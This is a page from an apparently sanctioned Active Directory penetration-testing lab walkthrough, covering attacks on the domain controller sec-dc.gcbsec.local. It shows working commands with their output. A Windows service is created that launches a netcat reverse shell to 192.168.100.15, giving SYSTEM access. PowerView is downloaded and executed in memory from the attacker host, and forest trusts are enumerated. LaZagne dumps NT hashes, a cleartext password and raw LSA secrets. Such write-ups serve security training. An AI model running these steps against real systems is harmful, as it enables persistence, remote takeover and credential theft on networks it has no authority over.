---
layout: default
---

## sec-dc.gcbsec.local 192.168.144.1

From the sec-dc.gcbsec.local Domain Controller it's required enumerate the trsuted domains for unrechable network from it.gcb.local. 


### 1. create persistence sevrice in sec-dc.gcbsec.local

With Enterprise Admin Privileges, create a new service: 
```
PS C:\Users\syslogagent\Documents> cmd /c sc create REVERSE binPath= "cmd /c C:\nc.exe -e cmd 192.168.100.15 443"
m cs raeRVREbnah cd/ :n.x e md1218101 4"[SC] CreateService SUCCESS
```

And spawn a new cmd to the attacker machine using netcat binary:
```
[sec-dc.gcbsec.local]: PS C:\Users\syslogagent\Documents> cmd /c sc start REVERSE
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
```
PS C:\Users\itemployee15> powercat -l -v -p 443 -t 99999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [192.168.144.1] port  [tcp] accepted (source port 58753)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
sec-dc

C:\Windows\system32>

```

### 2. Enumerate the trust domains for gcbsec.local


```
C:\Windows\system32>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15/PowerView.ps1")
IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15/PowerView.ps1")
PS C:\Windows\system32> Get-DomainTrust
Get-DomainTrust


SourceName      : gcbsec.local
TargetName      : gcbacc.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Inbound
WhenCreated     : 6/21/2019 5:04:37 AM
WhenChanged     : 4/29/2024 7:00:16 AM


```

```
PS C:\Windows\system32> Get-DnsServerZone -ZoneName gcbacc.local |fl *
Get-DnsServerZone -ZoneName gcbacc.local |fl *


MasterServers          : 192.168.79.1
DistinguishedName      : DC=gcbacc.local,cn=MicrosoftDNS,DC=ForestDnsZones,DC=gcbsec,DC=local
IsAutoCreated          : False
IsDsIntegrated         : True
IsPaused               : False
IsReadOnly             : False
IsReverseLookupZone    : False
IsShutdown             : False
ZoneName               : gcbacc.local
ZoneType               : Forwarder
DirectoryPartitionName : ForestDnsZones.gcbsec.local
ForwarderTimeout       : 3
ReplicationScope       : Forest
UseRecursion           : False
PSComputerName         :
CimClass               : root/Microsoft/Windows/DNS:DnsServerConditionalForwarderZone
CimInstanceProperties  : {DistinguishedName, IsAutoCreated, IsDsIntegrated, IsPaused...}
CimSystemProperties    : Microsoft.Management.Infrastructure.CimSystemProperties
```

```
PS C:\Windows\system32> Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}


DistinguishedName  : CN=gcbacc.local,CN=System,DC=gcbsec,DC=local
Name               : gcbacc.local
ObjectClass        : trustedDomain
ObjectGuid         : 55807cff-2ded-4096-af3f-7511048e5d20
PropertyNames      : {Direction, DisallowTransivity, DistinguishedName, ForestTransitive...}
AddedProperties    : {}
RemovedProperties  : {}
ModifiedProperties : {}
PropertyCount      : 23
```

```
PS C:\Windows\system32> Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext)  -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext)  -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl


name                    : Shadow Principal Configuration
member                  :
msDS-ShadowPrincipalSid :

name                    : accforest-ShadowEnterpriseAdmin
member                  :
msds-shadowprincipalsid : {1, 5, 0, 0...}
```

### 3. Hunt for credentials with LaZagne

``` 
[sec-dc.gcbsec.local]: PS C:\Users\Administrator\Documents> powershell -c  C:\Users\Administrator\Documents\LaZagne.exe all
powershell -c  C:\Users\Administrator\Documents\LaZagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 21219752-0ec1-452e-b466-9866185b7404
[+] System masterkey decrypted for 219aac60-3637-4a15-b3fe-8e1955b26075
[+] System masterkey decrypted for 3ccb1bdd-524a-4c5a-b9c0-f248d79f2253
[+] System masterkey decrypted for 63a986a4-19bb-4e38-8692-e614aaae100c
[+] System masterkey decrypted for b778c920-8087-4c79-bc97-f1938cee0af3
[+] System masterkey decrypted for de6d529b-feef-48c7-8219-33380a0b147b

########## User: SYSTEM ##########

------------------- Pypykatz passwords -----------------

[+] Shahash found !!!
Shahash: cb85408ab382f76ebbea65915143830f887ee468
Nthash: 70f6cdea590b81addc10fdc04a701fca
Login: SEC-DC$

[+] Shahash found !!!
Shahash: 268074612877c2e81d65e2b9f79ce567ed746090
Nthash: 4b28caca2273087d23d45d54b48e17ff
Login: Administrator

[+] Password found !!!
Type: ssp_creds
Domain: sec
Password: Password123
Login: syslogagent

------------------- Lsa_secrets passwords -----------------

$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   5E 6D D0 11 91 8B 5D FA 3C 5C 8C B3 24 3A 71 DE    ^m....].<...$:q.
0020   69 01 1B EB CA 9C 13 10 67 2C A6 73 58 04 31 01    i.......g,.sX.1.
0030   5E 9B E0 61 BA CA 03 99 A6 72 05 32 9B EB 41 4B    ^..a.....r.2..AK
0040   02 2D 92 8C 14 C0 C4 F6 79 17 32 05 3F 7B B7 56    .-......y.2.?{.V
0050   51 3E F9 1D D5 7D 1B 17 F3 98 A9 4C DA BA BD 9E    Q>...}.....L....
0060   DB FD C2 37 15 F6 15 D6 E0 2F 0A 34 A9 43 F2 D1    ...7...../.4.C..
0070   46 40 EA 02 C9 77 9D 94 EE 19 DA E9 AE 2C 54 D9    F@...w.......,T.
0080   91 B6 AD DD 35 ED B4 8A C1 AB 7E 7C 70 97 7A 3C    ....5.....~|p.z<
0090   47 06 31 61 CC 0B 99 DF 60 D0 71 BC 54 CA 9F 00    G.1a....`.q.T...
00A0   D6 35 20 84 B3 00 48 A9 4A 68 85 A1 BA 55 A4 C0    .5 ...H.Jh...U..
00B0   23 00 CE 14 69 19 12 8A CC 47 75 D8 F4 00 F9 8A    #...i....Gu.....
00C0   AD C1 D3 A5 4F E1 4C 0B B6 33 EB FD 85 61 01 34    ....O.L..3...a.4
00D0   CB AC 9E E4 59 52 1F AE 07 AA 06 3B 03 27 2A A8    ....YR.....;.'*.
00E0   24 88 2B FA BE 6C 28 F8 3B 34 87 A9 F2 FF 60 71    $.+..l(.;4....`q
00F0   51 64 EE 3E E9 FE 3A 06 AD D7 41 3C E1 0E 14 2A    Qd.>..:...A<...*
0100   17 FF 39 E6 4B C7 6A F0 1A E8 CB 0B C3 F2 4E BB    ..9.K.j.......N.

DPAPI_SYSTEM
0000   01 00 00 00 D7 4C B9 8F F9 8F FC F1 28 65 42 C7    .....L......(eB.
0010   49 EF 3F F9 1D 48 2B 06 E7 6E FF C8 4A 54 EC D7    I.?..H+..n..JT..
0020   2C C4 4A A2 5B 28 04 1B 70 2E 21 75                ,.J.[(..p.!u

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   E4 F4 7E 52 4A C5 7D 08 B6 97 40 F8 2F F4 32 AB    ..~RJ.}...@./.2.
0020   86 A5 0B DE 3D D8 D2 43 20 8E F3 F5 1A F3 75 48    ....=..C .....uH
0030   FA 24 5B F8 66 89 F3 20 40 9C FC 38 56 05 28 1A    .$[.f.. @..8V.(.
0040   C3 01 2D 8E C1 6E 23 BF 0B 4C B4 0E B9 78 9D 9E    ..-..n#..L...x..
0050   B9 2B 5D 37 24 85 B5 44 1A C5 4F 99 F0 32 0E 3C    .+]7$..D..O..2.<



[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 22.45256757736206
```


[back](./section6.html)
